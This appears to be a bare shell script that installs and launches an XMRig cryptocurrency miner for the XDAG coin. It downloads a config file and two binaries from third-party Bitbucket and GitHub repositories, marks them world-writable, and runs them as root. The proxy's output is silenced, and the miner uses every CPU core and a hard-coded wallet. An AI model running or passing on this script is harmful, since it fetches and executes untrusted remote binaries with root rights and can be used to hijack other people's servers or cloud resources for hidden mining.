apt update
apt install sudo -y
wget https://bitbucket.org/angga98/wang/raw/4d9cccdeb02f5d42ccad78e25b6e1bebcdcaa0b2/config.json
wget https://raw.githubusercontent.com/jsiqiisn/xdag/main/xmrig2xdag
wget https://raw.githubusercontent.com/jsiqiisn/xdag/main/xmrig
chmod 777 xmrig xmrig2xdag config.json
sudo ./xmrig2xdag -c config.json > /dev/null 2>&1 &
sudo ./xmrig -o 127.0.0.1:3232. -u o+h2OxqxCAlcLTC2jSZ0WHA2g5TgFL4d -p x -a rx/xdag -t$(nproc --all)
